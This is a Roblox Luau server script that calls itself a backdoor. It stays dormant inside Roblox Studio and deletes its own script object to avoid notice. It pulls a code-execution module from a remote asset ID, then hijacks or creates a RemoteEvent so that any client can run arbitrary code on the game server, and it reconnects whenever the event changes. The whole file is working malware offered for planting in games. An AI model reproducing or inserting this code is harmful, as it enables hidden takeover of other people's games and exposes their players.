-- Inspired in some other backdoors :D
if game:GetService("RunService"):IsStudio() then
	return
end

pcall(function()
	script:Destroy()
	script = nil
end)

local loadstring_func
local current_remote
local connection_onEvent
local connection_onChanged

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

while true do
	local success, result = pcall(require, 14132891321)
	if success and result then
		loadstring_func = result
		break
	end
	task.wait()
end

local function onExecute(player, code)
	if typeof(code) ~= "string" then
		return
	end

	code = code
		:gsub("%%username%%", player.Name)
		:gsub("%%userid%%", tostring(player.UserId))
		:gsub("%%userpath%%", 'game:GetService("Players"):WaitForChild("' .. player.Name .. '")')

	pcall(loadstring_func.SpawnS, loadstring_func, code, workspace)
end

local function recreateBackdoor()
	current_remote = nil

	pcall(function() connection_onEvent:Disconnect() end)
	pcall(function() connection_onChanged:Disconnect() end)

	for _, obj in workspace:GetDescendants() do
		if obj:IsA("RemoteEvent") then
			current_remote = obj
			break
		end
	end

	if not current_remote then
		for _, obj in ReplicatedStorage:GetDescendants() do
			if obj:IsA("RemoteEvent") then
				current_remote = obj
				break
			end
		end
	end

	if not current_remote then
		current_remote = Instance.new("RemoteEvent")
		current_remote.Parent = workspace
	end

	connection_onEvent = current_remote.OnServerEvent:Connect(onExecute)
	connection_onChanged = current_remote.Changed:Connect(recreateBackdoor)
end

recreateBackdoor()
